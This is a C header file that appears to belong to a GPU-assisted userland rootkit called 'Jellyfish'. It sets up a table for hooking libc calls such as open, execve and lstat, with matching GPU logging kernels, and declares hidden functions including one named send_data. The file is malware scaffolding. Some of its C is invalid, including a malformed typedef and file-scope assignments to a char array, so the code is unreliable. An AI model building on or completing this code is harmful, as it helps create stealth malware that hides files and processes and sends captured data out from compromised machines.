/*
 
Copyright (C) 2015  Team Jellyfish
 
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.
 
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
 
*/

#define _GNU_SOURCE

#ifndef __KIT_H__
#define __KIT_H__

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <limits.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <pty.h>
#include <signal.h>
#include <utmp.h>
#include <dirent.h>

// will add multi-os compatibility soon
#if defined (__APPLE__) || defined(MACOSX) || defined(OSX)
    #include <OpenCL/opencl.h>
#else
    #include <CL/opencl.h>
#endif

#define __JELLYFISH__ "kit.cl"
#define VRAM_LIMIT 1497965  /* 10mb divided by 7 gpu kernels */

// gpu functions
#define log_fopen "log_fopen"
#define log_mkdir "log_mkdir"
#define log_lstat "log_lstat"
#define log_lstat64 "log_lstat64"
#define log_creat "log_creat"
#define log_execve "log_execve"
#define log_open "log_open"

// syscalls
#define SYS_FOPEN 0
#define SYS_MKDIR 1
#define SYS_LSTAT 2
#define SYS_LSTAT64 3
#define SYS_CREAT 4
#define SYS_EXECVE 5
#define SYS_OPEN 6
#define SYSCALL_SIZE 7

typedef struct sys_calls{
    void *(*syscall_func)();
}; s_calls;

s_calls syscall[SYSCALL_SIZE];

const char syscall_table[SYSCALL_SIZE];
syscall_table[0] = "fopen";
syscall_table[1] = "mkdir";
syscall_table[2] = "lstat";
syscall_table[3] = "lstat64";
syscall_table[4] = "creat";
syscall_table[5] = "execve";
syscall_table[6] = "open";

// hidden gpu functions
cl_device_id create_device(void) __attribute__((visibility("hidden")));
cl_program build_program(cl_context ctx, cl_device_id dev, const char *filename) __attribute__((visibility("hidden")));

// hidden cpu functions
void jelly_init(void) __attribute__((visibility("hidden")));
static void limit_buf(const char *buffer) __attribute__((visibility("hidden")));
static void send_data(const char *buffer) __attribute__((visibility("hidden")));

#endif
